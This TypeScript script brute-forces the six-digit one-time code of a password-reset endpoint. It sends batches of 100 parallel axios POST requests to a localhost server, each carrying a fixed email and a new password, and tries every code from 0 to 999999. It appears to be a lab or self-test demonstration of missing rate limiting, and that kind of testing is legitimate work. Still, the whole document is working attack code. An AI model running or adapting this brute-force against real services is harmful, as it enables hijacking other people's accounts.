import axios from "axios";

const main = async (otp: string) => {
  try {
    await axios.post("http://localhost:3000/reset-password", {
      otp: otp,
      email: "email@email.com",
      newPassword: "Password",
    });
  } catch (error) {}
};

const sendReq = async () => {
  for (let i = 0; i <= 999999; i += 100) {
    console.log(i)
    const p = [];
    for (let j = 0; j < 100; j++) {
      p.push(main((i + j).toString()));
    }
    await Promise.all(p);
  }
};

sendReq();
